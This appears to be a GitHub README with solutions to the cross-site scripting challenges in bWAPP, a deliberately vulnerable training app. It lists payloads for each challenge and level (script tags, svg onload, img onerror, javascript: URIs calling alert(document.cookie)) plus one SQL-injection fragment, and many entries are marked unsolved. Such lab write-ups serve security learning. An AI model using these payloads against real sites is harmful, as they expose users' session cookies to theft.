# XSS-BWAPP-SOLUTION
Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scripting (XSS) challenges, meticulously curated and solved by BugBot19 (Nihar Rathod). This repository serves as a one-stop resource for anyone looking to understand and solve XSS vulnerabilities in the bWAPP (Buggy Web Application) framework.

Topics which are yet to be covered:
1)XSS-Reflected(phpMyAdmin)
2)XSS-Stored(SQLiteManager)
3)XSS-Stored(User-Agent)

# A3-Cross-Site-Scripting(XSS) #

# XSS - Reflected (GET)(LOW)
``` Payload- <script>alert(document.cookie)</script>(can be inserted in both parameter Firstname and lastname) ```

# XSS - Reflected (GET)(MEDIUM) 
``` Payload- <svg onload=alert(document.cookie)>(Can be inserted in both the parameter Firstname and Lastname) ```

# XSS - Reflected (GET)(High)
``` NYF ```

# XSS - Reflected (POST)(Low)
```Payload-<script>alert(document.cookie)</script>```

# XSS - Reflected (POST)(Medium)
```Payload-<svg onload=alert(document.cookie)>```

# XSS - Reflected (POST)(High)
```NYF```

# XSS - Reflected (JSON)(Low)
```Payload - <marquee onclick=alert(document.cookie)>Click on me</marquee>```

# XSS - Reflected (JSON)(Medium)
```Payload – NYF```

# XSS - Reflected (JSON)(High)
```Payload – NYF```

# XSS - Reflected (AJAX/JSON)(Low/Medium)
```Payload - <marquee onclick=alert(1)>Click!!!</marquee>```

# XSS - Reflected (AJAX/JSON)(High)
```Payload – NYF```

# XSS - Reflected (AJAX/XML)(Low/Medium)
```Payload - &lt;img src=&apos;#&apos; onerror=&apos;alert(document.cookie)&apos;&gt;```

# XSS - Reflected (AJAX/XML)(High)
```Payload - <a href="javascript:x='&percnt;27-alert('BugBot19 was here')-%27';">XSS</a>```

# XSS - Reflected (BackButton)(Low)
```Payload - ‘-alert(document.cookie)-’```

# XSS - Reflected (BackButton)(Medium)
```Payload – javascript:alert(document.cookie)```

# XSS - Reflected (BackButton)(High)
```Payload – Same as medium```
```Javascript:alert(document.cookie)```

# XSS - Reflected (CustomHeader)(Low)
```Payload- bWAPP:<script>alert(document.cookie)</script>```

# XSS - Reflected (CustomHeader)(Medium)
```Payload – bWAPP:<marquee onclick=alert(document.cookie)>click to win 1$</marquee>```

# XSS - Reflected (CustomHeader)(High)
```Paylaod - NYF```

# XSS - Reflected (EVAL)(Low)
```Payload – Date=alert(Document.cookie)```

# XSS - Reflected (EVAL)(Medium)
```Payload – Date=alert(document.cookie)```

# XSS - Reflected (EVAL)(High)
```Payload – NYF```

# XSS - Reflected (HREF)(Low)
```Payload - <marquee onclick=alert(document.cookie)>click to win 1$</marquee>```

# XSS - Reflected (HREF)(Medium)
```Payload - NYF```

# XSS - Reflected (HREF)(High)
```Payload – NYF```

# XSS - Reflected (Login Form)(Low)
```Payload – ‘ or 1=1; <script>alert(document.cookie)</script>```

# XSS - Reflected (Login Form)(Medium)
```Payload – NYF```

# XSS - Reflected (Login Form)(Medium)
```Payload – NYF```

# XSS - Reflected (PHP_Self)(Low)
```Payload – <a href="javascript:x='&percnt;27-alert('BugBot19 was here')-%27';">XSS</a>```

# XSS - Reflected (PHP_Self)(Medium)
```Payload – <marquee onclick=alert(document.cookie)>click to win 1$</marquee>```

# XSS - Reflected (PHP_Self)(High)
```Payload – ```

# XSS - Reflected (Referer)(Low)
```Payload – Referer:<svg onload=alert(document.cookie)>```

# XSS - Reflected (Referer)(Medium)
```Payload – Referer:<svg onload=alert(document.cookie)>```

# XSS - Reflected (Referer)(High)
```Payload – NYF```

# XSS - Reflected (User-Agent)(Low)
```Payload – User-agent:<script>alert(document.cookie)</script>```

# XSS - Reflected (User-Agent)(Medium)
```Payload – User-agent:<svg onload=alert(document.cookie)>```

# XSS - Reflected (User-Agent)(High)
```Payload – NYF```

# XSS - Stored (Blog)(Low)
```Payload – <img src=x onerror=alert(document.cookie)>```

# XSS – Stored (Blog)(Medium)
```Payload – <svg onload=alert(document.cookie)>```

# XSS - Stored (Blog)(High)
```Payload – NYF``` 


  

